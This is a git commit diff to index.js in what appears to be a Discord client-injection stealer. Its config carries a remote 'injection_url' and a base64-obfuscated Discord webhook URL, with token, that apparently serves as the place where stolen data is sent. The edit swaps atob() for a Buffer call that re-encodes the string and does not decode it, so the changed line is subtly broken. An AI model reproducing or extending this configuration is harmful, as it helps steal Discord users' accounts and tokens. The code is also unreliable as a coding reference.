cd90e7f6cce6b41612f4cd80c925897d827f7829
darwinikii <74075511+darwinikii@users.noreply.github.com>
2023-02-19 22:11:40 +0300

    Update index.js

--- index.js
+++ index.js
@@ -28,7 +28,7 @@ const config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/darwinikii/darwins/main/index.js",
-    webhook: atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3NjkxNDc0MDA3MDE5OTM0OC9xYzJPT3NjMDMxdE9QSktaYnNCNF9lRmdYLWt0TU1RMUl5SVFXNDdSVTJHWHBxdW4xYVZ1cjU5elpLS2V5bEFjV2llUg=="),
+    webhook: Buffer.from("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3NjkxNDc0MDA3MDE5OTM0OC9xYzJPT3NjMDMxdE9QSktaYnNCNF9lRmdYLWt0TU1RMUl5SVFXNDdSVTJHWHBxdW4xYVZ1cjU5elpLS2V5bEFjV2llUg==").toString("base64"),
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
